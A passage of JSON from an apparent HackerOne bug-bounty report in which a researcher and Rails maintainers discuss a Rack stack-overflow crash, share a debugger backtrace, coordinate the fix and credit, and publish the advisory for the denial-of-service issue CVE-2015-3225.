information.","automated_response":false,"created_at":"2015-02-20T18:57:09.908Z","updated_at":"2015-02-20T18:57:09.908Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":336377,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Huh, interesting. So this is something tied specifically to threads as I can't reproduce this in proc/lambdas or fibers.","automated_response":false,"created_at":"2015-02-20T22:46:41.987Z","updated_at":"2015-02-20T22:46:41.987Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":336419,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Not specifically to threads.  In this case, it's supposed to be a segv.  If you attach with a debugger, the backtrace looks like this:\n\n```\n(lldb) bt\n* thread #4: tid = 0x1c6d1, 0x00000001030f6edc ruby`vm_call0_body + 2108, stop reason = EXC_BAD_ACCESS (code=2, address=0x10440fff8)\n  * frame #0: 0x00000001030f6edc ruby`vm_call0_body + 2108\n    frame #1: 0x00000001030f88ac ruby`check_match + 268\n    frame #2: 0x00000001030df55f ruby`vm_exec_core + 6735\n    frame #3: 0x00000001030ef3a1 ruby`vm_exec + 129\n    frame #4: 0x00000001030f3fd5 ruby`invoke_block_from_c + 2213\n    frame #5: 0x00000001030ebd78 ruby`rb_yield_values + 408\n    frame #6: 0x00000001030f398a ruby`invoke_block_from_c + 602\n    frame #7: 0x00000001030ebbb8 ruby`rb_yield + 184\n    frame #8: 0x0000000102fdced1 ruby`each_pair_i + 17\n    frame #9: 0x0000000102fdd6d5 ruby`hash_foreach_iter + 37\n    frame #10: 0x0000000103087111 ruby`st_foreach_check + 113\n    frame #11: 0x0000000102fd7062 ruby`hash_foreach_call + 34\n```\n\n`EXC_BAD_ACCESS` is basically a memory error and usually delivered with a SEGV.  Apparently it is possible to cause a SEGV with a SystemStackError.  I'm trying to see if there's anything that can be done on the Ruby core side.  If not, we'll have to go with my patch and warn people not to do recursive functions with user input (which is not ideal).","automated_response":false,"created_at":"2015-02-20T23:53:00.122Z","updated_at":"2015-02-20T23:53:00.122Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":338475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, this got a bit more interesting.","automated_response":false,"created_at":"2015-02-23T18:55:48.824Z","updated_at":"2015-02-23T18:55:48.824Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":338476,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, this got a bit more interesting.","automated_response":false,"created_at":"2015-02-23T18:56:05.170Z","updated_at":"2015-02-23T18:56:05.170Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":392097,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @tenderlove, was wondering if this bug ended up getting some attention on the Ruby core side?","automated_response":false,"created_at":"2015-04-28T01:15:39.518Z","updated_at":"2015-04-28T01:15:39.518Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":438442,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ff7f00 hey, sorry for the slow response.  I've gone back and forth with the rest of the core team, and it sounds like they just aren't going to fix it.  We're going to go forward with the rack changes to work around this.  Unfortunately this will only address this one particular place where a stack overflow can occur.","automated_response":false,"created_at":"2015-06-03T06:55:55.148Z","updated_at":"2015-06-03T06:55:55.148Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":439998,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove Sounds good, thanks for the update.","automated_response":false,"created_at":"2015-06-03T21:30:01.710Z","updated_at":"2015-06-03T21:30:01.710Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":444899,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ff7f00 how would you like to be credited in the advisory?","automated_response":false,"created_at":"2015-06-08T18:48:35.766Z","updated_at":"2015-06-08T18:48:35.766Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":444914,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Tomek Rabczak from NCC Group should work.\n\nThanks,\nTomek","automated_response":false,"created_at":"2015-06-08T19:01:50.361Z","updated_at":"2015-06-08T19:01:50.361Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":474467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We shipped the fix for this here:\n\nhttps://groups.google.com/forum/#!topic/ruby-security-ann/gcUbICUmKMc\n\nSo I think we can close this now.","automated_response":false,"created_at":"2015-06-16T18:59:03.615Z","updated_at":"2015-06-16T18:59:03.615Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":474471,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2015-06-16T19:02:04.072Z","updated_at":"2015-06-16T19:02:04.072Z","actor":{"username":"rafaelfranca","cleared":false,"url":"/rafaelfranca","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ff7f00","url":"/ff7f00"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":474472,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sounds good, thanks a lot for all your help on this one @tenderlove and @nzkoz!","automated_response":false,"created_at":"2015-06-16T19:02:29.131Z","updated_at":"2015-06-16T19:02:29.131Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":474481,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":" ","automated_response":false,"created_at":"2015-06-16T19:06:05.179Z","updated_at":"2015-06-16T19:06:05.179Z","first_to_agree":true,"actor":{"username":"rafaelfranca","cleared":false,"url":"/rafaelfranca","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":474657,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-06-16T21:56:07.860Z","updated_at":"2015-06-16T21:56:07.860Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":474658,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-06-16T21:56:27.841Z","updated_at":"2015-06-16T21:56:27.841Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2359927,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-02-07T18:25:36.498Z","updated_at":"2018-02-07T18:25:36.498Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ff7f00","url":"/ff7f00"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":164,"category":"team","content":"Potential Denial of Service Vulnerability in Rack \n\nThere is a potential denial of service vulnerability in Rack. This \nvulnerability has been assigned the CVE identifier CVE-2015-3225. \n\nVersions Affected:  All. \nNot affected:       None. \nFixed Versions:     1.6.2, 1.5.4 \n\nImpact \n------ \nCarefully crafted requests can cause a `SystemStackError` and potentially \ncause a denial of service attack. \n\nAll users running an affected release should either upgrade or use one of the workarounds immediately. \n\nReleases \n-------- \nThe FIXED releases are available at the normal locations. \n\nWorkarounds \n----------- \nThere are no feasible workarounds for this issue. \n\n\nPatches \n------- \nTo aid users who aren't able to upgrade immediately we have provided patches for the two supported release series.  They are in git-am format and consist of a single changeset. \n\n* 1-6-deep_params.patch - Patch for 1.6 series \n* 1-5-deep_params.patch - Patch for 1.5 series \n\nPlease note that only the 1.6.x and 1.5.x series are supported at present.  Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases. \n\nCredits \n------- \n\nSpecial thanks to Tomek Rabczak from the NCC Group for reporting this! ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":20,"username":"arice","name":"Alex Rice","bio":"hackerone | internet bug bounty","cleared":false,"website":"https://twitter.com/senorarroz","location":"","created_at":"2013-06-18T19:55:34.230Z","url":"https://hackerone.com/arice","anc_triager":false,"hackerone_triager":false,"hackerone_employee":true,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}